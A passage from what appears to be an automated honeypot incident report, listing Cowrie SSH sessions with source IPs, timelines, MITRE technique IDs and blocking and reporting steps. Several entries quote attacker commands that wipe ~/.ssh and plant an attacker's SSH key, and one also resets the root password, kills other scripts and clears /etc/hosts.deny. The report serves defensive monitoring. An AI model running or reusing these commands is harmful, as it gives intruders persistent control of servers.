| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:06:42` | `cowrie.session.connect` |
| `2026-06-01 16:06:42` | `cowrie.client.version` |
| `2026-06-01 16:06:42` | `cowrie.client.kex` |
| `2026-06-01 16:06:42` | `cowrie.login.success` |
| `2026-06-01 16:06:42` | `cowrie.session.params` |
| `2026-06-01 16:06:42` | `cowrie.command.input` |
| `2026-06-01 16:06:42` | `cowrie.command.failed` |
| `2026-06-01 16:06:42` | `cowrie.log.closed` |
| `2026-06-01 16:06:43` | `cowrie.session.params` |
| `2026-06-01 16:06:43` | `cowrie.command.input` |
| `2026-06-01 16:06:43` | `cowrie.session.file_download` |
| `2026-06-01 16:06:43` | `cowrie.log.closed` |
| `2026-06-01 16:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.22[.]58` to AbuseIPDB if not already reported
- [ ] Block `202.165.22[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-571206e7d0ce

| Field | Detail |
|---|---|
| **Source IP** | `202.165.22[.]58` |
| **First Seen** | 2026-06-01 16:06 |
| **Last Seen** | 2026-06-01 16:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:06:44` | `cowrie.session.connect` |
| `2026-06-01 16:06:44` | `cowrie.client.version` |
| `2026-06-01 16:06:44` | `cowrie.client.kex` |
| `2026-06-01 16:06:45` | `cowrie.login.success` |
| `2026-06-01 16:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.22[.]58` to AbuseIPDB if not already reported
- [ ] Block `202.165.22[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79ed50ac9a5f

| Field | Detail |
|---|---|
| **Source IP** | `176.193.121[.]145` |
| **First Seen** | 2026-06-01 16:10 |
| **Last Seen** | 2026-06-01 16:11 |
| **Session Duration** | 103s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:10:03` | `cowrie.session.connect` |
| `2026-06-01 16:10:03` | `cowrie.client.version` |
| `2026-06-01 16:10:03` | `cowrie.client.kex` |
| `2026-06-01 16:10:08` | `cowrie.login.failed` |
| `2026-06-01 16:10:09` | `cowrie.login.success` |
| `2026-06-01 16:10:09` | `cowrie.session.params` |
| `2026-06-01 16:10:09` | `cowrie.command.input` |
| `2026-06-01 16:10:09` | `cowrie.command.failed` |
| `2026-06-01 16:10:09` | `cowrie.log.closed` |
| `2026-06-01 16:10:10` | `cowrie.session.params` |
| `2026-06-01 16:10:10` | `cowrie.command.input` |
| `2026-06-01 16:10:10` | `cowrie.log.closed` |
| `2026-06-01 16:10:10` | `cowrie.session.params` |
| `2026-06-01 16:10:10` | `cowrie.command.input` |
| `2026-06-01 16:10:11` | `cowrie.log.closed` |
| `2026-06-01 16:10:11` | `cowrie.session.params` |
| `2026-06-01 16:10:11` | `cowrie.command.input` |
| `2026-06-01 16:10:12` | `cowrie.log.closed` |
| `2026-06-01 16:10:12` | `cowrie.session.params` |
| `2026-06-01 16:10:12` | `cowrie.command.input` |
| `2026-06-01 16:10:13` | `cowrie.log.closed` |
| `2026-06-01 16:10:13` | `cowrie.session.params` |
| `2026-06-01 16:10:13` | `cowrie.command.input` |
| `2026-06-01 16:10:13` | `cowrie.log.closed` |
| `2026-06-01 16:10:14` | `cowrie.session.params` |
| `2026-06-01 16:10:14` | `cowrie.command.input` |
| `2026-06-01 16:10:14` | `cowrie.log.closed` |
| `2026-06-01 16:10:14` | `cowrie.session.params` |
| `2026-06-01 16:10:14` | `cowrie.command.input` |
| `2026-06-01 16:10:15` | `cowrie.log.closed` |
| `2026-06-01 16:10:15` | `cowrie.session.params` |
| `2026-06-01 16:10:15` | `cowrie.command.input` |
| `2026-06-01 16:10:15` | `cowrie.log.closed` |
| `2026-06-01 16:11:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.193.121[.]145` to AbuseIPDB if not already reported
- [ ] Block `176.193.121[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0416797d0d0e

| Field | Detail |
|---|---|
| **Source IP** | `43.160.214[.]131` |
| **First Seen** | 2026-06-01 16:12 |
| **Last Seen** | 2026-06-01 16:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:12:56` | `cowrie.session.connect` |
| `2026-06-01 16:12:56` | `cowrie.client.version` |
| `2026-06-01 16:12:57` | `cowrie.client.kex` |
| `2026-06-01 16:12:57` | `cowrie.login.success` |
| `2026-06-01 16:12:57` | `cowrie.session.params` |
| `2026-06-01 16:12:57` | `cowrie.command.input` |
| `2026-06-01 16:12:57` | `cowrie.command.failed` |
| `2026-06-01 16:12:57` | `cowrie.log.closed` |
| `2026-06-01 16:12:57` | `cowrie.session.params` |
| `2026-06-01 16:12:57` | `cowrie.command.input` |
| `2026-06-01 16:12:57` | `cowrie.session.file_download` |
| `2026-06-01 16:12:57` | `cowrie.log.closed` |
| `2026-06-01 16:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.214[.]131` to AbuseIPDB if not already reported
- [ ] Block `43.160.214[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0ae9fcbefe4

| Field | Detail |
|---|---|
| **Source IP** | `43.160.214[.]131` |
| **First Seen** | 2026-06-01 16:12 |
| **Last Seen** | 2026-06-01 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:12:59` | `cowrie.session.connect` |
| `2026-06-01 16:12:59` | `cowrie.client.version` |
| `2026-06-01 16:12:59` | `cowrie.client.kex` |
| `2026-06-01 16:12:59` | `cowrie.login.success` |
| `2026-06-01 16:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.214[.]131` to AbuseIPDB if not already reported
- [ ] Block `43.160.214[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1c9b30ce89

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-06-01 16:16 |
| **Last Seen** | 2026-06-01 16:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:16:55` | `cowrie.session.connect` |
| `2026-06-01 16:16:55` | `cowrie.client.version` |
| `2026-06-01 16:16:55` | `cowrie.client.kex` |
| `2026-06-01 16:16:56` | `cowrie.login.success` |
| `2026-06-01 16:16:56` | `cowrie.session.params` |
| `2026-06-01 16:16:56` | `cowrie.command.input` |
| `2026-06-01 16:16:56` | `cowrie.command.failed` |
| `2026-06-01 16:16:57` | `cowrie.log.closed` |
| `2026-06-01 16:16:57` | `cowrie.session.params` |
| `2026-06-01 16:16:57` | `cowrie.command.input` |
| `2026-06-01 16:16:57` | `cowrie.session.file_download` |
| `2026-06-01 16:16:57` | `cowrie.log.closed` |
| `2026-06-01 16:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9216153fdc

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-06-01 16:17 |
| **Last Seen** | 2026-06-01 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:17:00` | `cowrie.session.connect` |
| `2026-06-01 16:17:00` | `cowrie.client.version` |
| `2026-06-01 16:17:00` | `cowrie.client.kex` |
| `2026-06-01 16:17:01` | `cowrie.login.success` |
| `2026-06-01 16:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fc6ae3022a1

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-06-01 16:20 |
| **Last Seen** | 2026-06-01 16:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:20:52` | `cowrie.session.connect` |
| `2026-06-01 16:20:52` | `cowrie.client.version` |
| `2026-06-01 16:20:52` | `cowrie.client.kex` |
| `2026-06-01 16:20:53` | `cowrie.login.success` |
| `2026-06-01 16:20:53` | `cowrie.session.params` |
| `2026-06-01 16:20:53` | `cowrie.command.input` |
| `2026-06-01 16:20:53` | `cowrie.command.failed` |
| `2026-06-01 16:20:54` | `cowrie.log.closed` |
| `2026-06-01 16:20:54` | `cowrie.session.params` |
| `2026-06-01 16:20:54` | `cowrie.command.input` |
| `2026-06-01 16:20:54` | `cowrie.session.file_download` |
| `2026-06-01 16:20:54` | `cowrie.log.closed` |
| `2026-06-01 16:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a57d45d248c

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-06-01 16:20 |
| **Last Seen** | 2026-06-01 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:20:57` | `cowrie.session.connect` |
| `2026-06-01 16:20:57` | `cowrie.client.version` |
| `2026-06-01 16:20:57` | `cowrie.client.kex` |
| `2026-06-01 16:20:58` | `cowrie.login.success` |
| `2026-06-01 16:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8774df0100

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-06-01 16:22 |
| **Last Seen** | 2026-06-01 16:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:22:08` | `cowrie.session.connect` |
| `2026-06-01 16:22:08` | `cowrie.client.version` |
| `2026-06-01 16:22:08` | `cowrie.client.kex` |
| `2026-06-01 16:22:09` | `cowrie.login.success` |
| `2026-06-01 16:22:09` | `cowrie.session.params` |
| `2026-06-01 16:22:09` | `cowrie.command.input` |
| `2026-06-01 16:22:09` | `cowrie.command.failed` |
| `2026-06-01 16:22:10` | `cowrie.log.closed` |
| `2026-06-01 16:22:10` | `cowrie.session.params` |
| `2026-06-01 16:22:10` | `cowrie.command.input` |
| `2026-06-01 16:22:10` | `cowrie.session.file_download` |
| `2026-06-01 16:22:10` | `cowrie.log.closed` |
| `2026-06-01 16:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bec5bd30cbd

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-06-01 16:22 |
| **Last Seen** | 2026-06-01 16:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:22:12` | `cowrie.session.connect` |
| `2026-06-01 16:22:12` | `cowrie.client.version` |
| `2026-06-01 16:22:13` | `cowrie.client.kex` |
| `2026-06-01 16:22:13` | `cowrie.login.success` |
| `2026-06-01 16:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3c222d43d3

| Field | Detail |
|---|---|
| **Source IP** | `117.247.23[.]131` |
| **First Seen** | 2026-06-01 16:22 |
| **Last Seen** | 2026-06-01 16:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:22:57` | `cowrie.session.connect` |
| `2026-06-01 16:22:57` | `cowrie.client.version` |
| `2026-06-01 16:22:57` | `cowrie.client.kex` |
| `2026-06-01 16:22:57` | `cowrie.login.success` |
| `2026-06-01 16:22:57` | `cowrie.session.params` |
| `2026-06-01 16:22:57` | `cowrie.command.input` |
| `2026-06-01 16:22:57` | `cowrie.command.failed` |
| `2026-06-01 16:22:57` | `cowrie.log.closed` |
| `2026-06-01 16:22:57` | `cowrie.session.params` |
| `2026-06-01 16:22:57` | `cowrie.command.input` |
| `2026-06-01 16:22:57` | `cowrie.session.file_download` |
| `2026-06-01 16:22:57` | `cowrie.log.closed` |
| `2026-06-01 16:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.23[.]131` to AbuseIPDB if not already reported
- [ ] Block `117.247.23[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c75a7e5c30d

| Field | Detail |
|---|---|
| **Source IP** | `117.247.23[.]131` |
| **First Seen** | 2026-06-01 16:22 |
| **Last Seen** | 2026-06-01 16:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:22:59` | `cowrie.session.connect` |
| `2026-06-01 16:22:59` | `cowrie.client.version` |
| `2026-06-01 16:22:59` | `cowrie.client.kex` |
| `2026-06-01 16:22:59` | `cowrie.login.success` |
| `2026-06-01 16:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.23[.]131` to AbuseIPDB if not already reported
- [ ] Block `117.247.23[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-119cdb2c1c1b

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-06-01 16:24 |
| **Last Seen** | 2026-06-01 16:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:24:50` | `cowrie.session.connect` |
| `2026-06-01 16:24:50` | `cowrie.client.version` |
| `2026-06-01 16:24:50` | `cowrie.client.kex` |
| `2026-06-01 16:24:51` | `cowrie.login.success` |
| `2026-06-01 16:24:51` | `cowrie.session.params` |
| `2026-06-01 16:24:51` | `cowrie.command.input` |
| `2026-06-01 16:24:51` | `cowrie.command.failed` |
| `2026-06-01 16:24:51` | `cowrie.log.closed` |
| `2026-06-01 16:24:52` | `cowrie.session.params` |
| `2026-06-01 16:24:52` | `cowrie.command.input` |
| `2026-06-01 16:24:52` | `cowrie.session.file_download` |
| `2026-06-01 16:24:52` | `cowrie.log.closed` |
| `2026-06-01 16:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-002db7e3a8bb

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-06-01 16:24 |
| **Last Seen** | 2026-06-01 16:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:24:54` | `cowrie.session.connect` |
| `2026-06-01 16:24:54` | `cowrie.client.version` |
| `2026-06-01 16:24:54` | `cowrie.client.kex` |
| `2026-06-01 16:24:55` | `cowrie.login.success` |
| `2026-06-01 16:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76f2807d8551

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-06-01 16:26 |
| **Last Seen** | 2026-06-01 16:26 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:O4g6ZASxA6Pi"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 16:26:41` | `cowrie.session.connect` |
| `2026-06-01 16:26:42` | `cowrie.client.version` |
| `2026-06-01 16:26:42` | `cowrie.client.kex` |
| `2026-06-01 16:26:42` | `cowrie.login.success` |
| `2026-06-01 16:26:42` | `cowrie.session.params` |
| `2026-06-01 16:26:42` | `cowrie.command.input` |
| `2026-06-01 16:26:42` | `cowrie.command.failed` |
| `2026-06-01 16:26:43` | `cowrie.log.closed` |
| `2026-06-01 16:26:43` | `cowrie.session.params` |
| `2026-06-01 16:26:43` | `cowrie.command.input` |
| `2026-06-01 16:26:43` | `cowrie.session.file_download` |
